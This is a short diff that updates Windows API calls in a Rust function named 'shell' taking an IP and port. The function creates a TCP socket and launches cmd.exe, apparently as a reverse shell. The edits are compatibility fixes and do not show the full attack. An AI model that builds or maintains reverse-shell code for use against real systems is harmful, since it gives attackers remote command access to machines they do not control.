@@ -32,7 +32,7 @@ pub fn shell(ip: &str, port: u16) {
     let socket = unsafe {
         WSASocketA(
             AF_INET.0 as i32,
-            SOCK_STREAM as i32,
+            SOCK_STREAM.0,
             IPPROTO_TCP.0,
             None,
             0,
@@ -106,7 +106,7 @@ pub fn shell(ip: &str, port: u16) {
             &mut PROCESS_INFORMATION::default(),
         )
     };
-    if !create_res.as_bool() {
+    if create_res.is_err() {
         panic!("Could not start cmd.exe process");
     }
 }
